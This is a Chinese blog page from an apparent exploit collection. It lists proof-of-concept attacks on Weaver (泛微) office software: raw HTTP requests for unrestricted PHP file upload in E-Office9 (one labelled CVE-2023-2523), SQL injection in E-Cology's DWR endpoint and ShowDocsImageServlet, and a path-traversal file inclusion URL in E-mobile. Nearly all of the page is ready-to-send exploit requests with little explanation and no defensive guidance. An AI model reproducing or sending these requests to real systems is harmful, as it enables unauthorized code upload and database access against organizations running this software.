<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>泛微 - ConsT27's Blog</title>
    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u6cdb\u5fae", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_2" },
              {title: "e-office9 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20", url: "#e-office9" },
              {title: "\u6cdb\u5faeE-Office9\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CVE-2023-2523 POC", url: "#e-office9-cve-2023-2523-poc" },
              {title: "E-Cology \u67d0\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e POC", url: "#e-cology-sql-poc" },
              {title: "\u6cdb\u5fae  ShowDocsImagesql\u6ce8\u5165\u6f0f\u6d1e", url: "#showdocsimagesql" },
              {title: "\u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b", url: "#weaver-e-office9" },
          ]},
        ];

    </script>
    <script src="../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/" class="btn btn-xs btn-link">
        用友
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/" class="btn btn-xs btn-link">
        广联达
      </a>
    </div>
    
  </div>

    

    <h1 id="_1">泛微</h1>
<h2 id="_2">目录</h2>
<ul>
<li><a href="#e-office9-任意文件上传">e-office9 任意文件上传</a></li>
<li><a href="#泛微-Weaver-E-Office9-前台文件包含POC">泛微 Weaver E-Office9 前台文件包含
    POC</a></li>
<li><a href="#泛微E-Office9文件上传漏洞-CVE-2023-2523-POC">泛微E-Office9文件上传漏洞 CVE-2023-2523 POC</a></li>
<li><a href="#E-Cology-某版本-SQL注入漏洞-POC">E-Cology 某版本 SQL注入漏洞 POC</a></li>
<li><a href="#泛微--ShowDocsImagesql注入漏洞">泛微  ShowDocsImagesql注入漏洞</a></li>
<li>
<p><a href="#泛微-Weaver-E-Office9-前台文件包含">泛微 Weaver E-Office9 前台文件包含</a></p>
</li>
<li>
<p>泛微ecology（也称为泛微协同办公平台）是一种企业级协同办公软件，旨在提高企业内部协作和沟通效率。它提供了各种功能，如任务管理、文档共享、工作流程管理等，可以帮助企业实现信息共享和协同办公。</p>
</li>
<li>emobile是泛微公司开发的一款移动办公应用，旨在让用户能够随时随地通过移动设备访问和处理企业数据和任务。emobile提供了移动端的协同办公功能，如查看和编辑文档、处理任务、查看日程安排等。</li>
<li>e-office 中小型企业oa</li>
</ul>
<h2 id="e-office9">e-office9 任意文件上传</h2>
<p>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件/inc/jquery/uploadify/uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。
Weaver E-Office9.0
POC or EXP</p>
<pre><code class="language-纯文本">POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.232.137:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;666.php&quot;
Content-Type: application/octet-stream

&lt;?php phpinfo();?&gt;

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;&quot;
Content-Type: application/octet-stream

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--

</code></pre>
<p>泛微 Weaver E-Office9 前台文件包含
POC</p>
<hr />
<p><a href="http://URL/E-mobile/App/Init.php?weiApi=1\&amp;sessionkey=ee651bec023d0db0c233fcb562ec7673_admin\&amp;m=12344554_../../attachment/xxx.xls" title="http://URL/E-mobile/App/Init.php?weiApi=1\&amp;sessionkey=ee651bec023d0db0c233fcb562ec7673_admin\&amp;m=12344554_../../attachment/xxx.xls">http://URL/E-mobile/App/Init.php?weiApi=1\&amp;sessionkey=ee651bec023d0db0c233fcb562ec7673_admin\&amp;m=12344554_../../attachment/xxx.xls</a></p>
<h2 id="e-office9-cve-2023-2523-poc">泛微E-Office9文件上传漏洞 CVE-2023-2523 POC</h2>
<pre><code class="language-纯文本">POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1

Host:192.168.233.10:8082

Cache-Control:max-age=0

Upgrade-Insecure-Requests:1

Origin:null

Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt

Accept-Encoding:gzip, deflate

Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

Connection:close

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

Content-Disposition:form-data; name=&quot;upload_quwan&quot;; filename=&quot;1.php.&quot;

Content-Type:image/jpeg

&lt;?phpphpinfo();?&gt;

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
</code></pre>
<h2 id="e-cology-sql-poc">E-Cology 某版本 SQL注入漏洞 POC</h2>
<pre><code class="language-纯文本">  POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1

Host: ip:port

User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36

Connection: close

Content-Length: 189

Content-Type: text/plain

Accept-Encoding: gzip

callCount=1

page=

httpSessionId=

scriptSessionId=

c0-scriptName=DocDwrUtil

c0-methodName=ifNewsCheckOutByCurrentUser

c0-id=0

c0-param0=string:1 AND 1=1

c0-param1=string:1

batchId=0
</code></pre>
<h2 id="showdocsimagesql">泛微  ShowDocsImagesql注入漏洞</h2>
<pre><code class="language-纯文本">
GET
/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection: close
</code></pre>
<h2 id="weaver-e-office9">泛微 Weaver E-Office9 前台文件包含</h2>
<pre><code class="language-纯文本">http://URL/E-mobile/App/Init.php?weiApi=1&amp;sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&amp;m=12344554_../../attachment/xxx.xls
</code></pre>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/" class="btn btn-xs btn-link">
        用友
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/" class="btn btn-xs btn-link">
        广联达
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>